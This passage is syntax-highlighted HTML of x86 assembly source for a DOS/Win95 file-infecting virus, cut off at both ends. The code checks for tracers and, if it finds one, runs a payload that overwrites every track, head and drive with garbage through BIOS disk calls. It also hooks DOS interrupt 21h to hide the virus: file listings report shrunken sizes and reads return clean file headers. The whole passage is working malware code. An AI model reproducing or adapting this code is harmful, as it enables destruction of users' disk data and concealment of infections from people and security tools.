                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; tracers such as TBClean.</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">STI</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">                  </span><span class="sc1">; They're the same?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Payload</span><span class="sc0">                 </span><span class="sc1">; Else fuck him over.</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">


</span><span class="sc1">; NO HOPE = NO FEAR</span><span class="sc0">
</span><span class="sc5">Payload</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Trash_Text</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

</span><span class="sc5">Trash_Loop</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">                  </span><span class="sc1">; Reset drive.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt13h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033Fh</span><span class="sc0">               </span><span class="sc1">; Trash track with garbage.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt13h</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">                  </span><span class="sc1">; Take all tracks.</span><span class="sc0">
                </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; Take all heads.</span><span class="sc0">
                </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; Take all drives.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09h</span><span class="sc0">                 </span><span class="sc1">; Let them know what hit 'em.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Trash_Text</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Trash_Loop</span><span class="sc0">


</span><span class="sc5">IRC_Hint</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'&lt;Soulfly-&gt;'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">NewInt21h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">666h</span><span class="sc0">
</span><span class="sc5">Active_Switch</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">Chk_Stealth_F</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; Findfirst (FCB) ?</span><span class="sc0">
                </span><span class="sc6">JBE</span><span class="sc0">     </span><span class="sc5">Chk_Stealth_H</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">                 </span><span class="sc1">; Findnext (FCB) ?</span><span class="sc0">
                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Chk_Stealth_H</span><span class="sc0">

</span><span class="sc5">Stealth_Size_F</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">                  </span><span class="sc1">; Abort if error.</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">JMP_RETF2_Exit</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_DTA</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">BX.FCB_Drive</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; Test for an extended FCB.</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">FCB_Format_OK</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">                 </span><span class="sc1">; Coz we don't need it.</span><span class="sc0">

</span><span class="sc5">FCB_Format_OK</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">BX.FCB_Date</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">RETF2_Exit</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">BX.FCB_Date</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">BX.FCB_Size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">BX.FCB_Size</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

</span><span class="sc5">JMP_RETF2_Exit</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">RETF2_Exit</span><span class="sc0">

</span><span class="sc5">Chk_Stealth_H</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc0">                 </span><span class="sc1">; Findfirst (handle) ?</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Chk_Stealth_W</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">                 </span><span class="sc1">; Findnext (handle) ?</span><span class="sc0">
                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Chk_Stealth_W</span><span class="sc0">

</span><span class="sc5">Stealth_Size_H</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">               </span><span class="sc1">; Execute the function.</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">RETF2_Exit</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_DTA</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">BX.Handle_Date</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">RETF2_Exit</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">BX.Handle_Date</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">BX.Handle_Size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">BX.Handle_Size</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">RETF2_Exit</span><span class="sc0">

</span><span class="sc5">Chk_Stealth_W</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">714Eh</span><span class="sc0">               </span><span class="sc1">; Findfirst (Win95) ?</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Chk_Stealth_Re</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">714Fh</span><span class="sc0">               </span><span class="sc1">; Findnext (Win95) ?</span><span class="sc0">
                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Chk_Stealth_Re</span><span class="sc0">

                </span><span class="sc2">.386</span><span class="sc0">                            </span><span class="sc1">; This routine will only be</span><span class="sc0">
                                                </span><span class="sc1">; called in Win95, which is</span><span class="sc0">
                                                </span><span class="sc1">; 386+.</span><span class="sc0">
</span><span class="sc5">Stealth_Size_W</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">RETF2_Exit</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">DI.Win95_Date</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">                      </span><span class="sc1">; Stamp is in DOS-format?</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Is_DOS_Format</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">71A7h</span><span class="sc0">               </span><span class="sc1">; Convert Win95-format to</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc0">                  </span><span class="sc1">; DOS-format.</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">DI.Win95_Time</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

</span><span class="sc5">Is_DOS_Format</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Century</span><span class="sc0">             </span><span class="sc1">; This file is infected?</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">RETF2_Exit</span><span class="sc0">

                </span><span class="sc1">; Restore original filesize.</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">DI.Win95_Size_Lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">DI.Win95_Size_Hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">RETF2_Exit</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">DI.Win95_Date</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Century</span><span class="sc0">

</span><span class="sc5">RETF2_Exit</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POPA</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">

                </span><span class="sc6">RETF</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

                </span><span class="sc2">.286</span><span class="sc0">                            </span><span class="sc1">; Back to 80286-mode.</span><span class="sc0">

</span><span class="sc5">Chk_Stealth_Re</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">                 </span><span class="sc1">; Read file?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Stealth_Read</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Chk_Seek_EOF</span><span class="sc0">

</span><span class="sc5">Stealth_Read</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Bytes_To_Read</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Read_Buffer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Handle</span><span class="sc0">
                </span><span class="sc6">JS</span><span class="sc0">      </span><span class="sc5">JMP_Exit_Abort</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">File_Infected</span><span class="sc0">

</span><span class="sc5">JMP_Exit_Abort</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Exit_Abort</span><span class="sc0">

</span><span class="sc5">File_Infected</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Save_File_Pos</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; Calculate end-position of</span><span class="sc0">
</span><span class="sc5">Bytes_To_Read</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; the caller's read.</span><span class="sc0">
                </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Save it in DI:SI.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_EOF</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">          </span><span class="sc1">; Calculate uninfected size.</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                  </span><span class="sc1">; Read reaches virusbody?</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Not_In_Body</span><span class="sc0">
                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">In_Body</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">JNA</span><span class="sc0">     </span><span class="sc5">Not_In_Body</span><span class="sc0">

</span><span class="sc5">In_Body</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Restore_File_Pos</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">                      </span><span class="sc1">; Size uninfected.</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Calculate amount of bytes</span><span class="sc0">
                                                </span><span class="sc1">; to read.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Do_Read</span><span class="sc0">

</span><span class="sc5">Not_In_Body</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Bytes_To_Read</span><span class="sc0">

</span><span class="sc5">Do_Read</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">PUSHA</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Restore_File_Pos</span><span class="sc0">

                </span><span class="sc6">POPA</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; Do the stealthed read.</span><span class="sc0">
</span><span class="sc5">Read_Buffer</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Read_File</span><span class="sc0">

                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">RETF2_Exit</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">BP.Reg_AX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; Store amount of bytes read.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Save_File_Pos</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Seek_Header</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Read_Header</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Crypt_Header</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; Position after read.</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">                  </span><span class="sc1">; Pos readstart</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Exit_St_Read</span><span class="sc0">            </span><span class="sc1">; They read from the header?</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">Exit_St_Read</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Calculate end-offset read.</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Header_End</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
                </span><span class="sc6">JNA</span><span class="sc0">     </span><span class="sc5">Read_St_Header</span><span class="sc0">

</span><span class="sc5">Header_End</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">

</span><span class="sc5">Read_St_Header</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Calculate amount of bytes</span><span class="sc0">
                                                </span><span class="sc1">; to stealth from header.</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Read_Buffer</span><span class="sc0">

                </span><span class="sc6">CLD</span><span class="sc0">                             </span><span class="sc1">; Copy the clean header into</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">                   </span><span class="sc1">; the caller's buffer.</span><span class="sc0">

</span><span class="sc5">Exit_St_Read</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Restore_File_Pos</span><span class="sc0">

</span><span class="sc5">JMP_RETF2_E</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">RETF2_Exit</span><span class="sc0">

</span><span class="sc5">Restore_Abort</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Restore_File_Pos</span><span class="sc0">

</span><span class="sc5">Exit_Abort</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POPA</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">

</span><span class="sc5">Chk_Seek_EOF</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">               </span><span class="sc1">; Seek to EOF ?</span><span class="sc0">
